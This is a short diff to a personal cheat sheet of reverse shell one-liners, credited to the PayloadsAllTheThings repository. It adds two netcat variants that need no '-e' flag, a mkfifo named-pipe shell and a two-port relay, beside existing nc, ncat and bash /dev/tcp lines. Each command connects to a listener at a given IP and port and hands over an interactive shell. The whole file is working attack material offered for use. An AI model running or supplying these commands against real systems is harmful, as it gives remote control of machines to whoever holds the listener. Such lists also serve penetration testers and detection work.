@@ -1,8 +1,13 @@
 # shell is from https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp
 
 reverse shell:
+[nc]
 nc 192.168.0.10 4242 -e /bin/bash
 ncat -c bash 192.168.0.10 4242
+
+[nc] No "-e" parameter required:
+mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.100 8888 >/tmp/f
+nc 127.0.0.1 4444 | /bin/sh -i 2>&1 | nc 127.0.0.1 4445
 
 bash -i >& /dev/tcp/192.168.0.10/4242 0>&1
 
